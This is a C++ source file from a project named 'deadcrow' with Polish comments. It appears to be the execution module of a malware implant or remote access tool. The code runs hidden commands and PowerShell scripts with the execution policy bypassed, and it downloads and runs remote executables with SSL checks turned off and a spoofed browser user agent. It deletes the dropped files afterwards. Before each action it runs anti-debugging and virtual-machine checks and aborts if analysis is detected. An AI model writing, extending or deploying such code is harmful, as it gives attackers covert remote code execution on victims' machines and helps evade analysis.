#include "exec.h"
#include "../utils/anti_debug.h"
#include "../utils/aes.h"
#include <iostream>
#include <fstream>
#include <curl/curl.h>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>
#include <random>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/wait.h>
#endif

namespace deadcrow {
namespace core {

// Callback dla libcurl do zapisywania danych do pliku
size_t WriteToFileCallback(void* ptr, size_t size, size_t nmemb, FILE* stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

Exec::Exec(const std::string& aes_key) : aes_key_(aes_key) {
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[EXEC] " << status << std::endl;
        #endif
    };
}

bool Exec::executeCommand(const std::string& command, std::string& output) {
    reportStatus("Wykonywanie komendy: " + command);
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    output.clear();
    
#ifdef _WIN32
    // Windows
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    
    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        reportStatus("Nie udało się utworzyć pipe");
        return false;
    }
    
    // Upewnij się, że uchwyt do odczytu nie jest dziedziczony
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    
    // Przygotuj struktury do utworzenia procesu
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES;
    ZeroMemory(&pi, sizeof(pi));
    
    // Utwórz proces
    if (!CreateProcessA(NULL, const_cast<LPSTR>(command.c_str()), NULL, NULL, TRUE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        reportStatus("Nie udało się utworzyć procesu");
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return false;
    }
    
    // Zamknij uchwyt do zapisu, aby móc wykryć EOF
    CloseHandle(hWritePipe);
    
    // Odczytaj dane z pipe
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead != 0) {
        buffer[bytesRead] = '\0';
        output += buffer;
    }
    
    // Poczekaj na zakończenie procesu
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // Pobierz kod wyjścia
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    // Zwolnij zasoby
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);
    
    reportStatus("Komenda wykonana z kodem wyjścia: " + std::to_string(exitCode));
    return (exitCode == 0);
#else
    // Linux
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
    
    if (!pipe) {
        reportStatus("Nie udało się utworzyć pipe");
        return false;
    }
    
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        output += buffer.data();
    }
    
    // Pobierz kod wyjścia
    int exitCode = WEXITSTATUS(pclose(pipe.release()));
    
    reportStatus("Komenda wykonana z kodem wyjścia: " + std::to_string(exitCode));
    return (exitCode == 0);
#endif
}

bool Exec::downloadAndExecute(const std::string& url, const std::string& output_path) {
    reportStatus("Pobieranie i wykonywanie pliku z URL: " + url);
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Generuj losową nazwę pliku, jeśli nie podano
    std::string path = output_path;
    if (path.empty()) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        
        std::stringstream ss;
        ss << std::tmpnam(nullptr) << "_";
        for (int i = 0; i < 8; ++i) {
            ss << std::hex << dis(gen);
        }
        
#ifdef _WIN32
        path = ss.str() + ".exe";
#else
        path = ss.str() + ".bin";
#endif
    }
    
    // Pobierz plik
    if (!downloadFile(url, path)) {
        reportStatus("Nie udało się pobrać pliku");
        return false;
    }
    
    // Wykonaj plik
    bool result = executeFile(path);
    
    // Usuń plik, jeśli nie podano ścieżki wyjściowej
    if (output_path.empty()) {
        std::remove(path.c_str());
    }
    
    return result;
}

bool Exec::executePowerShell(const std::string& script, std::string& output) {
#ifdef _WIN32
    reportStatus("Wykonywanie skryptu PowerShell");
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Zapisz skrypt do pliku tymczasowego
    std::string temp_path = std::tmpnam(nullptr);
    temp_path += ".ps1";
    
    std::ofstream script_file(temp_path);
    if (!script_file) {
        reportStatus("Nie udało się utworzyć pliku tymczasowego");
        return false;
    }
    
    script_file << script;
    script_file.close();
    
    // Wykonaj skrypt
    std::string command = "powershell.exe -ExecutionPolicy Bypass -File \"" + temp_path + "\"";
    bool result = executeCommand(command, output);
    
    // Usuń plik tymczasowy
    std::remove(temp_path.c_str());
    
    return result;
#else
    reportStatus("PowerShell nie jest dostępny na tej platformie");
    return false;
#endif
}

bool Exec::executeBash(const std::string& script, std::string& output) {
#ifndef _WIN32
    reportStatus("Wykonywanie skryptu Bash");
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Zapisz skrypt do pliku tymczasowego
    std::string temp_path = std::tmpnam(nullptr);
    temp_path += ".sh";
    
    std::ofstream script_file(temp_path);
    if (!script_file) {
        reportStatus("Nie udało się utworzyć pliku tymczasowego");
        return false;
    }
    
    script_file << "#!/bin/bash\n" << script;
    script_file.close();
    
    // Nadaj uprawnienia do wykonania
    std::string chmod_command = "chmod +x \"" + temp_path + "\"";
    std::string chmod_output;
    if (!executeCommand(chmod_command, chmod_output)) {
        reportStatus("Nie udało się nadać uprawnień do wykonania");
        std::remove(temp_path.c_str());
        return false;
    }
    
    // Wykonaj skrypt
    std::string command = "\"" + temp_path + "\"";
    bool result = executeCommand(command, output);
    
    // Usuń plik tymczasowy
    std::remove(temp_path.c_str());
    
    return result;
#else
    reportStatus("Bash nie jest dostępny na tej platformie");
    return false;
#endif
}

bool Exec::downloadFile(const std::string& url, const std::string& output_path) {
    reportStatus("Pobieranie pliku z URL: " + url + " do: " + output_path);
    
    // Inicjalizuj sesję CURL
    CURL* curl = curl_easy_init();
    if (!curl) {
        reportStatus("Nie udało się zainicjalizować libcurl");
        return false;
    }
    
    // Otwórz plik do zapisu
    FILE* fp = fopen(output_path.c_str(), "wb");
    if (!fp) {
        reportStatus("Nie udało się otworzyć pliku do zapisu");
        curl_easy_cleanup(curl);
        return false;
    }
    
    // Konfiguracja żądania
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteToFileCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Wyłącz weryfikację SSL (w produkcji lepiej włączyć)
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
    
    // Wykonaj żądanie
    CURLcode res = curl_easy_perform(curl);
    
    // Zamknij plik
    fclose(fp);
    
    // Zwolnij zasoby
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        reportStatus("Błąd podczas pobierania pliku: " + std::string(curl_easy_strerror(res)));
        return false;
    }
    
    reportStatus("Plik pobrany pomyślnie");
    return true;
}

bool Exec::executeFile(const std::string& path) {
    reportStatus("Wykonywanie pliku: " + path);
    
#ifdef _WIN32
    // Windows
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Utwórz proces
    if (!CreateProcessA(path.c_str(), NULL, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        reportStatus("Nie udało się utworzyć procesu");
        return false;
    }
    
    // Poczekaj na zakończenie procesu
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // Pobierz kod wyjścia
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    // Zwolnij zasoby
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    reportStatus("Plik wykonany z kodem wyjścia: " + std::to_string(exitCode));
    return (exitCode == 0);
#else
    // Linux
    // Nadaj uprawnienia do wykonania
    std::string chmod_command = "chmod +x \"" + path + "\"";
    std::string chmod_output;
    if (!executeCommand(chmod_command, chmod_output)) {
        reportStatus("Nie udało się nadać uprawnień do wykonania");
        return false;
    }
    
    // Wykonaj plik
    std::string command = "\"" + path + "\"";
    std::string output;
    bool result = executeCommand(command, output);
    
    return result;
#endif
}

void Exec::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void Exec::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

bool Exec::checkForDebugging() {
    return utils::AntiDebug::performAllChecks();
}

} // namespace core
} // namespace deadcrow
